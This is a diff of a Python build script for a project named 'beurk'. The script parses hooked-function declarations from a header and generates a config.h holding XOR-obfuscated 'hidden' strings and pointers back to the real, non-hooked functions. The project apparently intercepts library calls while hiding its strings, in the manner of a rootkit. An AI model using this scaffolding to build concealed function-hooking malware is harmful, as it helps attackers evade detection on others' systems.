@@ -1,8 +1,12 @@
 #!/usr/bin/env python2
 
-import sys, os
+import sys
+import os
+import re
 import commands
-from pprint import pprint
+
+from pprint import pprint # debug
+
 
 def help():
     """display usage help message and exit
@@ -123,6 +127,22 @@ if ret == 0:
 
 
 ###############################################################################
+### parse function hooks infos from includes/hooks.h
+
+# for each hooked function, generate `REAL_<NAME>` function pointer macro.
+function_hooks = []
+regex = re.compile("^(\w+)\s+(\w+)\(.*\)\s+_HOOKED\s*;\s*$")
+header = open("includes/hooks.h")
+for line in header.read().splitlines():
+    try:
+        match = regex.match(line).groups()
+        assert len(match) == 2
+    except:
+        continue
+    function_hooks.append(match)
+
+
+###############################################################################
 ### generate config.h header file
 
 HEADER = """/*
@@ -147,6 +167,9 @@ HEADER = """/*
 
 #pragma once
 
+#include <stdlib.h>
+
+/* common macros from beurk config file*/
 """
 
 
@@ -183,23 +206,33 @@ def xor(string, key):
     return result
 
 literals_code = """
+
+/* store hidden (XORed) literals */
 #define NUM_LITERALS (%(num_literals)d)
 #define MAX_LITERAL_SIZE (%(max_literal_size)d)
-
 static char __hidden_literals[NUM_LITERALS][MAX_LITERAL_SIZE] = {
     %(literals)s
 };
 
+
+/* store real function pointers (hooks fallbacks) */
+#define NUM_HOOKS (%(num_hooks)d)
+static ssize_t (*__non_hooked_symbols[NUM_HOOKS])();
+
+
+/* hidden literals and function pointers */
 %(literals_macros)s
 """
 
+xor_key = 0x00 if config["DEBUG_LEVEL"] else config["XOR_KEY"]
+
 literals = []
-literals_macros = []
 max_literal_size = 0
 num_literals = 0
-macro_tpl = "#define %s ((const char *)(__hidden_literals[%d]))"
 
-xor_key = 0x00 if config["DEBUG_LEVEL"] else config["XOR_KEY"]
+# add `hidden_literal` types to the list of literals
+literals_macros = []
+macro_tpl = "#define %s ((const char *)(__hidden_literals[%d]))"
 for key, _type in CONFIG_KEYS.items():
     if _type != type_hidden_literal:
         continue
@@ -209,12 +242,23 @@ for key, _type in CONFIG_KEYS.items():
     max_literal_size = max(max_literal_size, len(value))
     num_literals += 1
 
+# add `function_hooks` names to the list of literals
+macro_tpl = "#define REAL_%s ((%s)(__non_hooked_symbols[%d]))"
+num_hooks = 0
+for _type, name in function_hooks:
+    literals.append(xor(name, xor_key))
+    literals_macros.append(macro_tpl % (name.upper(), _type, num_hooks))
+    max_literal_size = max(max_literal_size, len(name))
+    num_literals += 1
+    num_hooks += 1
+
 max_literal_size += 1
 
 HEADER += literals_code % {
         "literals": "\n    ".join(literals),
         "max_literal_size": max_literal_size + 1,
         "num_literals": num_literals,
+        "num_hooks": len(function_hooks),
         "literals_macros": "\n".join(literals_macros),
         }
 
@@ -275,7 +319,6 @@ def run_build_command(cmd):
 
 SOURCES = [
         "src/beurk.c",
-        "src/hook.c",
         ]
 
 config["CFLAGS"] = """
